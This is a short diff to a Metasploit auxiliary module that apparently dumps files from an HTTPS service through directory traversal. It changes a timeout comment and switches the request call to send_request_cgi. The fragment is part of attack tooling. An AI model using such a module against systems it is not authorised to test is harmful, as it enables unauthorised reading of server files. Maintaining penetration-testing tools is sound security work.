@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
       'DefaultOptions'      => {
         'RPORT'             => 443,
         'SSL'               => true,
-        'HttpClientTimeout' => 5 # This seems sane, but it's not a float
+        'HttpClientTimeout' => 5 # This seems sane
       },
       'Notes'               => {
         'Stability'         => [CRASH_SAFE],
@@ -104,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     files.each do |path, info|
       print_status("Dumping #{path}")
 
-      res = send_request_raw(
+      res = send_request_cgi(
         'method'  => 'GET',
         'uri'     => dir_traversal(path),
         'partial' => true # Allow partial response due to timeout
